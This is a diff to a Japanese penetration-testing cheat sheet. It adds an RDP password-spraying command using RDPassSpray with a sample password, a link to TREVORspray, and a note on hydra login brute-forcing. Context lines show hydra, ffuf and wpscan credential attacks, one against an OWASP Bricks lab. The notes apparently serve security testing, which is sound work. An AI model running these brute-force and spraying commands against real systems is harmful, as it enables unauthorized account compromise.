@@ -26,6 +26,7 @@ curl https://<target>/sites/favicon/images/favicon.ico | md5sum
 https://github.com/vanhauser-thc/thc-hydra
 
 ```shell
+# 成功条件の場合は、S=logout.php 等のように指定する
 hydra $TARGET http-post-form "/owaspbricks/login-3/index.php:username=^USER^&password=^PASS^&Login=submit:Wrong user name or password." -L http_default_users.txt -P http_default_pass.txt
 ```
 
@@ -44,6 +45,19 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Cr
 ```shell
 wpscan --url $TARGET --passwords password.txt --usernames elliot
 ```
+
+### RDP
+
+https://github.com/xFreed0m/RDPassSpray
+
+```shell
+# -d でADのドメイン名指定可能
+python3 RDPassSpray.py -U users.txt -p Spring2021! -t <ip>:3026
+```
+
+### その他スプレーツール
+
+https://github.com/blacklanternsecurity/TREVORspray
 
 ## コマンドインジェクション（netcat でシェルを起動）
 
@@ -227,7 +241,9 @@ AppBでは、audienceを参照してadminアクセスを拒否するべきだが
 ```
 
 #### JWTTools
+
 https://github.com/ticarpi/jwt_tool
+
 ```shell
 $ git clone https://github.com/ticarpi/jwt_tool
 $ python3 -m pip install -r requirements.txt
